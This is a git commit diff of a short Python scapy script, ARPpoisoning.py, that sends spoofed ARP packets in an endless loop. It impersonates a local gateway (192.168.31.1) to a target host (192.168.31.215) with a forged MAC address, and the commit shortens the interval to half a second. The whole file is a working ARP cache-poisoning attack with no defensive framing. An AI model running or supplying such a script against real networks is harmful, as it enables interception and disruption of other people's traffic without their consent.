a10120bbb8cb8bd8aea14c9b2a9fd7dc934376ad
kondy <51909685+2739673455@users.noreply.github.com>
2023-10-05 18:55:10 +0800

    Add files via upload

--- ARPpoisoning.py
+++ ARPpoisoning.py
@@ -1,11 +1,13 @@
 from scapy.all import *
 import time
 
-# pkt = Ether(src="00:00:00:00:00:00", dst="ff:ff:ff:ff:ff:ff") / \
-#     ARP(psrc="192.168.13.2", pdst="192.168.13.129", hwsrc="6a:08:3a:2f:5a:02")
-pkt = ARP(psrc="192.168.13.2", pdst="192.168.13.129", hwsrc="6a:08:3a:2f:5a:02") / \
-    IP(src="192.168.13.2", dst="192.168.13.129")
+ether = Ether(src="00:00:00:00:00:00", dst="ff:ff:ff:ff:ff:ff")
+arp = ARP(psrc="192.168.31.1", pdst="192.168.31.215", hwsrc="6a:08:3a:2f:5a:02")
+ip = IP(src="192.168.31.1", dst="192.168.31.215")
+# pkt = ether / arp
+pkt = arp / ip
+print(pkt.show())
 
 while True:
     send(pkt)
-    time.sleep(1)
+    time.sleep(0.5)
